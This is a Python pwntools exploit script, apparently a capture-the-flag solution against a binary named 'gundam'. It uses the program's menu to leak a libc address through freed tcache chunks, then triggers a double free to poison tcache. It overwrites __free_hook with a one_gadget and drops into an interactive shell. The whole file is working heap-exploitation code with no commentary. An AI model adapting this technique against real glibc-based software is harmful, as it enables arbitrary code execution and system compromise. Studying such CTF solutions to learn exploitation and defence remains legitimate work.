from pwn import*

context.log_level = "debug"
context.terminal = ['tmux', 'splitw', '-h']

target = './gundam'
p = process(target)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')


def build(name,type):
    p.recv()
    p.sendline("1")
    p.recv()
    p.send(name)
    p.recv()
    p.sendline(str(type))    

def visit():
    p.recvuntil("Your choice : ")
    p.sendline("2")
    
def destory(idx):
    p.recv()
    p.sendline("3")
    p.recv()
    p.sendline(str(idx))
    
def blow_up():
    p.recvuntil("Your choice : ")
    p.sendline("4")
    

for i in range(9):
    build("aaaa",1)
    
for i in range(2,9):
    destory(i)

destory(0)
destory(1)
blow_up()

for i in range(7):
    build("aaaa",1)

build("bbbbbbbb",1) #7
build("aaaaaaaa",1) #8

visit()
p.recvuntil("bbbbbbbb")
leak = u64(p.recv(8)[:6].ljust(8,'\x00'))
log.info("leak ==>{}".format(hex(leak)))
libc_base = leak - 0x3dac78
libc.address = libc_base
free_hook = libc.symbols['__free_hook']
one_gadget = 0xfccde + libc_base

log.info("libc_base ==> {}".format(hex(libc_base)))

destory(6)  
destory(5)
destory(7)
destory(7)  #double free

blow_up()
build(p64(free_hook),1) #tcache_dup
build("aaaa",1)
build(p64(one_gadget),1)

destory(0)
p.interactive()

